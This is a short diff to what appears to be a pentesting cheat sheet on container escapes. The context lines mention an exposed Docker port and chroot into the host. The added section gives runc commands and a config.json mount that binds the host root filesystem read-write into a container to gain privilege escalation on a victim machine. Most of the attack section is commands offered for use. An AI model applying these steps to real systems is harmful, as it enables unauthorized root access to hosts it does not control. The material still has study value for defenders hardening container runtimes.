@@ -90,3 +90,31 @@ if there is open docker port in remote machine we can connect to there.&#x20;
 * `chroot /host`\
   \
   `Now we are in remote machine file system.`
+
+## 5. Use Case Runc in victim machine and priv esc with runc
+
+````
+runc spec
+
+# open config.json file in the directory and these in mount section 
+
+```python
+{
+"type": "bind",
+"source": "/",
+"destination": "/",
+"options": ["rbind",
+            "rw",
+            "rprivate"
+        ]
+},
+```
+
+# then 
+
+mkdir rootfs
+
+runc run demo
+
+
+````
